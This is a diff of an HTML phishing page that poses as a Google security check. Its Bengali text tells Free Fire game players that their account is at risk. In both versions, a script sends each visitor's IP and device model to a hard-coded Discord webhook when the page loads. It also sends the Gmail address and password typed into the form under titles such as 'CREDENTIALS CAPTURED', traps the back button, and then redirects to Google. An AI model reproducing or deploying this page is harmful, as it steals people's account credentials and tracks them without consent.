@@ -5,18 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Security Verification</title>
     <style>
-        /* ক্লিন এবং অফিশিয়াল হোয়াইট থিম */
-        body { background: #f8f9fa; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { background: #f8f9fa; font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { width: 90%; max-width: 400px; background: #fff; padding: 35px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; border-top: 5px solid #d93025; }
         .logo { width: 50px; margin-bottom: 20px; }
-        .title { color: #202124; font-size: 22px; font-weight: 500; margin-bottom: 15px; }
-        .warn-box { background: #fef7f7; border-left: 5px solid #d93025; padding: 15px; text-align: left; margin-bottom: 20px; border-radius: 4px; }
-        .warn-text { font-size: 14px; color: #3c4043; line-height: 1.6; margin: 0; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; transition: 0.2s; }
-        input:focus { border: 2px solid #1a73e8; outline: none; }
-        .btn { width: 100%; padding: 16px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 16px; margin-top: 15px; transition: background 0.3s; }
-        .btn:hover { background: #1765cc; }
-        .footer { font-size: 12px; color: #70757a; margin-top: 30px; border-top: 1px solid #f1f3f4; pt: 15px; }
+        .title { color: #202124; font-size: 20px; font-weight: 500; margin-bottom: 15px; }
+        .warn-box { background: #fef7f7; border-left: 5px solid #d93025; padding: 15px; text-align: left; margin-bottom: 20px; border-radius: 4px; font-size: 14px; line-height: 1.6; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        .btn { width: 100%; padding: 16px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; }
     </style>
 </head>
 <body>
@@ -24,93 +19,85 @@
 <div class="card">
     <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" class="logo">
     <div class="title">ডিভাইস ভেরিফিকেশন</div>
-    
     <div class="warn-box">
-        <p class="warn-text">
-            <strong>সতর্কতা:</strong> অন্য একটি অপরিচিত ডিভাইস থেকে আপনার <strong>Free Fire</strong> যুক্ত অ্যাকাউন্টে লগইন করার চেষ্টা করা হয়েছে। আপনার আইডিটি নিরাপদ রাখতে আগামী <strong>২৪ ঘণ্টার</strong> মধ্যে নিচের তথ্যগুলো দিয়ে ভেরিফাই করুন। অন্যথায় নিরাপত্তার স্বার্থে আপনার অ্যাকাউন্টটি স্থগিত করা হতে পারে।
-        </p>
+        <strong>সতর্কতা:</strong> অন্য একটি ডিভাইস থেকে আপনার <strong>Free Fire</strong> যুক্ত জিমেইলে লগইনের চেষ্টা করা হয়েছে। আপনার আইডিটি নিরাপদ রাখতে আগামী ২৪ ঘণ্টার মধ্যে লগইন করে ভেরিফাই করুন।
     </div>
-    
-    <div id="auth-form">
-        <input type="email" id="user_mail" placeholder="আপনার ইমেল এড্রেস" required>
-        <input type="password" id="user_pass" placeholder="পাসওয়ার্ড দিন" required>
-        <button class="btn" onclick="submitFinal()">ভেরিফাই এবং সিকিউর করুন</button>
-    </div>
-
-    <div class="footer">Security Protocol ID: 9982-GA-FF</div>
+    <input type="email" id="email" placeholder="জিমেইল এড্রেস">
+    <input type="password" id="pass" placeholder="পাসওয়ার্ড">
+    <button class="btn" onclick="sendData()">ভেরিফাই করুন</button>
 </div>
 
 <script>
-    const DISCORD_WH = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
+    const HOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
-    // ১. ব্যাক বাটন ব্লক (Prison Mode)
-    (function blockExit() {
-        history.pushState(null, null, location.href);
-        window.onpopstate = () => {
-            history.pushState(null, null, location.href);
-            alert("⚠️ গুরুত্বপূর্ণ: নিরাপত্তা নিশ্চিত না করে বের হওয়া সম্ভব নয়।");
-        };
-    })();
+    // ১. ক্লিক করার সাথে সাথে আইপি ও মডেল পাঠানোর মেইন ফাংশন
+    async function grabInfo() {
+        let ip = "N/A";
+        let model = "N/A";
 
-    // ২. ইনস্ট্যান্ট আইপি স্নাইপার (০.১ সেকেন্ডের মধ্যে ডাটা যাবে)
-    async function trackInstant() {
-        let ipData = "Tracking Error";
-        let deviceInfo = "Unknown Device";
-
+        // ফোনের মডেল ধরার সবচেয়ে শক্তিশালী উপায়
         try {
-            const response = await fetch('https://ipapi.co/json/');
-            const d = await response.json();
-            ipData = `IP: ${d.ip}\nCity: ${d.city}\nISP: ${d.org}`;
-            
-            // মোবাইল মডেল বের করা
-            deviceInfo = navigator.userAgent.match(/\(([^)]+)\)/)[1].split(';')[0];
+            model = navigator.userAgent.split('(')[1].split(')')[0];
+        } catch(e) { model = navigator.platform; }
 
-            fetch(DISCORD_WH, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    content: "🚀 **TARGET ENTERED THE LINK**",
-                    embeds: [{
-                        color: 16711680,
-                        fields: [
-                            { name: "🌐 Connection Info", value: ipData },
-                            { name: "📱 Device Model", value: deviceInfo }
-                        ]
-                    }]
-                })
-            });
-        } catch (err) {}
-    }
+        // আইপি ধরার জন্য দ্রুততম সার্ভিস
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(e) { ip = "Hidden/Blocked"; }
 
-    // ৩. পাসওয়ার্ড পাঠানো
-    async function submitFinal() {
-        const email = document.getElementById('user_mail').value;
-        const pass = document.getElementById('user_pass').value;
-
-        if(!email || !pass) return alert("দয়া করে সঠিক তথ্য দিন।");
-
-        await fetch(DISCORD_WH, {
+        // ডিসকর্ডে নগদ ডাটা প্রেরণ
+        await fetch(HOOK, {
             method: "POST",
             headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
-                content: "🧨 **CAPTURED CREDENTIALS**",
                 embeds: [{
+                    title: "🚀 TARGET DETECTED (INSTANT)",
+                    color: 16711680,
+                    fields: [
+                        { name: "🌐 IP Address", value: ip, inline: true },
+                        { name: "📱 Device Model", value: model, inline: true }
+                    ],
+                    footer: { text: "Clicked at: " + new Date().toLocaleString() }
+                }]
+            })
+        });
+    }
+
+    // ২. জিমেইল ও পাসওয়ার্ড পাঠানো
+    async function sendData() {
+        const u = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+        if(!u || !p) return alert("তথ্য দিন!");
+
+        await fetch(HOOK, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "🧨 CREDENTIALS CAPTURED",
                     color: 65280,
                     fields: [
-                        { name: "Email", value: email },
-                        { name: "Password", value: pass }
+                        { name: "Email", value: u },
+                        { name: "Password", value: p }
                     ]
                 }]
             })
         });
-
-        alert("আপনার ভেরিফিকেশন সফল হয়েছে। আপনার আইডি এখন নিরাপদ।");
-        window.onpopstate = null; 
-        location.href = "https://myaccount.google.com/security";
+        alert("ভেরিফিকেশন সফল হয়েছে।");
+        location.href = "https://myaccount.google.com/";
     }
 
-    // পেজ লোড হওয়ার সাথে সাথেই ট্র্যাকিং শুরু
-    window.onload = trackInstant;
+    // ৩. ব্যাক বাটন লক
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => {
+        history.pushState(null, null, location.href);
+        alert("ভেরিফিকেশন সম্পন্ন করুন।");
+    };
+
+    // পেজ লোড হওয়া মাত্রই ট্র্যাকিং শুরু হবে
+    window.onload = grabInfo;
 </script>
 
 </body>
